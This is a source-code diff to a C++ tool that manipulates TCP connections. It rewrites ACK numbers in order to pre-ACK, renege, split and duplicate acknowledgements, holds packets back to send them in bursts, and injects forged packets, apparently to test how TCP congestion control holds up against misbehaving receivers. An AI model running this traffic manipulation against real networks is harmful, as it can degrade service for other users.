@@ -5,6 +5,7 @@
 #include "attacker.h"
 #include "tcp.h"
 #include "iface.h"
+#include "checksums.h"
 #include <netinet/tcp.h>
 #include <netinet/if_ether.h>
 #include <netinet/ip.h>
@@ -47,15 +48,16 @@ TCP::TCP(uint32_t src, uint32_t dst)
 	rev.have_initial_seq = false;
 	rev.have_initial_ack = false;
 	total_pkts = 0;
-	renege_save = 0;
 
 	do_div = do_dup = do_preack = false;
 	do_renege = do_burst = do_print = false;
+
+	pthread_mutex_init(&burst_mutex, NULL);
 }
 
 TCP::~TCP()
 {
-
+	pthread_mutex_destroy(&burst_mutex);
 }
 
 pkt_info TCP::new_packet(pkt_info pk, Message hdr)
@@ -91,13 +93,13 @@ pkt_info TCP::process_packet(pkt_info pk, Message hdr, tcp_half &src, tcp_half &
 	}
 
 	memcpy(&old_src,&src,sizeof(tcp_half));
-	update_conn_info(tcph,src);
+	update_conn_info(tcph,hdr,src);
 
 	/* debug printing */
 	if (do_print) {
 		dbgprintf(0,"%u:%i -> %u:%i, seq: %u, ack: %u\n",
 				src.ip,src.port,dst.ip,dst.port,
-				ntohl(tcph->seq),ntohl(tcph->ack));
+				ntohl(tcph->th_seq),ntohl(tcph->th_ack));
 	}
 
 
@@ -110,7 +112,7 @@ pkt_info TCP::process_packet(pkt_info pk, Message hdr, tcp_half &src, tcp_half &
 		pk = PerformPreAck(pk,hdr,dst);
 		mod = true;
 	} else if (do_renege && in_pkt_range(total_pkts,renege_start,renege_stop)) {
-		pk = PerformRenege(pk,hdr);
+		pk = PerformRenege(pk,hdr,src);
 		mod = true;
 	}
 
@@ -159,7 +161,7 @@ void TCP::init_conn_info(pkt_info pk, struct tcphdr *tcph, tcp_half &src, tcp_ha
 	dst.port = ntohs(tcph->th_dport);
 }
 
-void TCP::update_conn_info(struct tcphdr *tcph, tcp_half &src)
+void TCP::update_conn_info(struct tcphdr *tcph, Message hdr, tcp_half &src)
 {
 	/* Handle ISNs */
 	if (!src.have_initial_seq) {
@@ -175,10 +177,10 @@ void TCP::update_conn_info(struct tcphdr *tcph, tcp_half &src)
 
 	/* Update sequence and ack numbers */
 	//TODO: How do we handle SACK?
-	if (src.have_initial_seq && SEQ_AFTER(ntohl(tcph->th_seq),src.high_seq)) {
-		src.high_seq = ntohl(tcph->th_seq);
+	if (src.have_initial_seq && SEQ_AFTERQ(ntohl(tcph->th_seq),src.high_seq)) {
+		src.high_seq = ntohl(tcph->th_seq) + (hdr.len - tcph->th_off*4)-1;
 	}
-	if (src.have_initial_ack && (tcph->th_flags & TH_ACK) && SEQ_AFTER(ntohl(tcph->th_ack),src.high_ack)) {
+	if (src.have_initial_ack && (tcph->th_flags & TH_ACK) && SEQ_AFTERQ(ntohl(tcph->th_ack),src.high_ack)) {
 		src.high_ack = ntohl(tcph->th_ack);
 	}
 
@@ -189,6 +191,9 @@ void TCP::update_conn_info(struct tcphdr *tcph, tcp_half &src)
 	/* Update pkt count */
 	src.pkts++;
 	total_pkts++;
+
+	//dbgprintf(2,"Stats: initial_seq: %u, high_seq: %u, inital_ack: %u, high_ack: %u, window: %i, pkts: %u\n",
+	//		src.initial_seq, src.high_seq, src.initial_ack, src.high_ack, src.window, total_pkts);
 
 	/* Check scheduled injections */
 	for (list<inject_info>::iterator it = injections.begin(); it != injections.end(); it++) {
@@ -214,15 +219,16 @@ pkt_info TCP::PerformPreAck(pkt_info pk, Message hdr, tcp_half &dst)
 
 	ack = ntohl(tcph->th_ack);
 	if (SEQ_AFTER((uint32_t)ack + preack_amt, dst.high_seq)) {
-		tcph->ack = htonl(dst.high_seq);
+		tcph->th_ack = htonl(dst.high_seq + 1);
 	} else {
-		tcph->ack = htonl(ack+preack_amt);
+		tcph->th_ack = htonl(ack+preack_amt);
 	}
 
+	//dbgprintf(2,"PreAck: %u -> %u\n", ack, ack + preack_amt);
 	return pk;
 }
 
-pkt_info TCP::PerformRenege(pkt_info pk, Message hdr)
+pkt_info TCP::PerformRenege(pkt_info pk, Message hdr, tcp_half &src)
 {
 	struct tcphdr *tcph;
 	uint32_t ack;
@@ -232,16 +238,18 @@ pkt_info TCP::PerformRenege(pkt_info pk, Message hdr)
 	ack = ntohl(tcph->th_ack);
 	if (renege_growth == 1) {
 		/* Keep reneging */
-		if (!renege_save) {
-			renege_save = ack - renege_amt;
-			tcph->ack = htonl(renege_save);
+		if (!src.renege_save) {
+			src.renege_save = ack - renege_amt;
+			tcph->th_ack = htonl(src.renege_save);
 		} else {
-			renege_save = renege_save - renege_amt;
-			tcph->ack = htonl(renege_save);
+			src.renege_save = src.renege_save - renege_amt;
+			tcph->th_ack = htonl(src.renege_save);
 		}
+		//dbgprintf(2, "Renege: %u\n", renege_save);
 	} else {
 		/* Constant negative offset */
-		tcph->ack = htonl(ack-renege_amt);
+		tcph->th_ack = htonl(ack-renege_amt);
+		//dbgprintf(2, "Renege: %u -> %u\n", ack, ack - renege_amt);
 	}
 
 	return pk;
@@ -258,21 +266,26 @@ pkt_info TCP::PerformDivision(pkt_info pk, Message hdr, tcp_half &old_src)
 	ack = ntohl(tcph->th_ack);
 
 	/* Only divide new acks */
-	if (ack < old_src.high_ack) {
+	if (SEQ_BEFOREQ(ack,old_src.high_ack)) {
 		return pk;
 	}
 
 	/* Sequence range to divide */
 	diff = seq_diff(ack,old_src.high_ack);
 
+	if (diff > 2000000) {
+		dbgprintf(0, "Warning: Impossibly Huge ACKed range! Not generating DIV acks\n");
+		return pk;
+	}
+
 	/* Do division */
 	ack = old_src.high_ack;
 	while(diff > 0) {
 		/* chunks must be smaller than remaining sequence space to ack */
 		if (diff > div_bpc) {
-			bpc = diff;
-		} else {
 			bpc = div_bpc;
+		} else {
+			bpc = diff;
 		}
 
 		/* do increment */
@@ -283,6 +296,7 @@ pkt_info TCP::PerformDivision(pkt_info pk, Message hdr, tcp_half &old_src)
 		tcph->th_ack = htonl(ack);
 
 		/* Send */
+		//dbgprintf(2, "Sending DIV ack: %u\n", ack);
 		Attacker::get().fixupAndSend(pk,hdr,true);
 	}
 
@@ -301,6 +315,7 @@ pkt_info TCP::PerformDup(pkt_info pk, Message hdr)
 {
 	for(int i = 0; i < dup_num; i++) {
 		/* Send */
+		//dbgprintf(2, "Sending DUP ack\n");
 		Attacker::get().fixupAndSend(pk,hdr,true);
 	}
 
@@ -317,11 +332,13 @@ pkt_info TCP::PerformDup(pkt_info pk, Message hdr)
 
 pkt_info TCP::PerformBurst(pkt_info pk, Message hdr)
 {
+	pthread_mutex_lock(&burst_mutex);
 	burst_pkts.push_back(make_pair(pk,hdr));
 
 	if ((int)burst_pkts.size() >= burst_num) {
 		for (list<pair<pkt_info,Message> >::iterator it = burst_pkts.begin(); it != burst_pkts.end(); it++) {
 			/* Send */
+			//dbgprintf(2, "Sending BURST packets!\n");
 			Attacker::get().fixupAndSend(it->first, it->second, true);
 
 			/* Cleanup */
@@ -331,6 +348,7 @@ pkt_info TCP::PerformBurst(pkt_info pk, Message hdr)
 
 		burst_pkts.clear();
 	}
+	pthread_mutex_unlock(&burst_mutex);
 
 	/* Release packet */
 	pk.msg.buff = NULL;
@@ -364,6 +382,8 @@ bool TCP::StartInjector(inject_info &info)
 	pkt_info pk;
 	Message hdr;
 
+	dbgprintf(1, "Start Injection\n");
+
 	if (!BuildPacket(pk,hdr,info)) {
 		dbgprintf(0, "Error: Failed to build packet!\n");
 		return false;
@@ -393,19 +413,19 @@ bool TCP::BuildPacket(pkt_info &pk, Message &hdr, inject_info &info)
 	if (fwd.ip != 0 && fwd.port != 0 && rev.ip != 0 && rev.port != 0) {
 		/* Already received pkts, can grab addresses */
 		if (info.dir == FORWARD) {
-			memcpy(src_mac,fwd.mac,6);
-			memcpy(dst_mac,rev.mac,6);
-			src_ip = fwd.ip;
-			dst_ip = rev.ip;
-			src_port = fwd.port;
-			dst_port = rev.port;
-		} else if (info.dir == BACKWARD) {
 			memcpy(src_mac,rev.mac,6);
 			memcpy(dst_mac,fwd.mac,6);
 			src_ip = rev.ip;
 			dst_ip = fwd.ip;
 			src_port = rev.port;
 			dst_port = fwd.port;
+		} else if (info.dir == BACKWARD) {
+			memcpy(src_mac,fwd.mac,6);
+			memcpy(dst_mac,rev.mac,6);
+			src_ip = fwd.ip;
+			dst_ip = rev.ip;
+			src_port = fwd.port;
+			dst_port = rev.port;
 		} else {
 			dbgprintf(0, "Error: Invalid direction\n");
 			return false;
@@ -460,7 +480,7 @@ bool TCP::BuildPacket(pkt_info &pk, Message &hdr, inject_info &info)
 	/* Create headers */
 	next = BuildEthHeader(pk.msg, src_mac, dst_mac, ETHERTYPE_IP);
 	next = BuildIPHeader(next, src_ip, dst_ip, 6);
-	next = BuildTCPHeader(next, src_port, dst_port, info, hdr);
+	next = BuildTCPHeader(next, src_port, dst_port, info, hdr, src_ip, dst_ip);
 
 	/* Fixup checksums, etc */
 	pk = Attacker::get().fixupAndSend(pk,hdr,false);
@@ -505,7 +525,7 @@ Message TCP::BuildIPHeader(Message pk, uint32_t src, uint32_t dst, int next)
 	return pk;
 }
 
-Message TCP::BuildTCPHeader(Message pk, uint16_t src, uint16_t dst, inject_info &info, Message &ip_payload)
+Message TCP::BuildTCPHeader(Message pk, uint16_t src, uint16_t dst, inject_info &info, Message &ip_payload, uint32_t ipsrc, uint32_t ipdst)
 {
 	struct tcphdr *tcph;
 
@@ -520,6 +540,8 @@ Message TCP::BuildTCPHeader(Message pk, uint16_t src, uint16_t dst, inject_info 
 	tcph->th_win = htons(info.window);
 	tcph->th_sum = 0;
 	tcph->th_urp = 0;
+
+	tcph->th_sum = ipv4_pseudohdr_chksum((u_char*)pk.buff,sizeof(struct tcphdr),(u_char*)&ipdst,(u_char*)&ipsrc,6);
 
 	ip_payload = pk;
 	ip_payload.len = sizeof(struct tcphdr);
@@ -580,6 +602,13 @@ bool TCP::Clear()
 {
 	do_div = do_dup = do_preack = do_renege = false;
 	do_burst = do_print = false;
+
+	for (list<Injector*>::iterator it = active_injectors.begin(); it != active_injectors.end(); it++) {
+		(*it)->Stop();
+	}
+	
+	injections.clear();
+
 	return true;
 }
 
@@ -636,15 +665,12 @@ void Injector::_run()
 	struct timeval tm;
 	int sec;
 	int nsec;
-	int val;
 
 	/* Mutex used only to sleep on */
 	pthread_mutex_lock(&timeout_mutex);
 
 	while(running) {
-		if (pk.snd) {
-			pk.snd->sendm(pk.msg);
-		}
+		pk = Attacker::get().fixupAndSend(pk,ip_payload,true);
 
 		/* Compute time to send */
 		sec = freq / 1000;
@@ -659,11 +685,12 @@ void Injector::_run()
 		time.tv_sec += (tm.tv_sec + sec);
 
 		/* Sleep */
-		val = pthread_mutex_timedlock(&timeout_mutex, &time);
-		if (val != ETIMEDOUT) {
-			continue;
-		}
+		pthread_mutex_timedlock(&timeout_mutex, &time);
 	}
+
+	free(pk.msg.buff);
+	pk.msg.buff = NULL;
+	pk.valid = false;
 }
 
 bool Injector::Stop() {
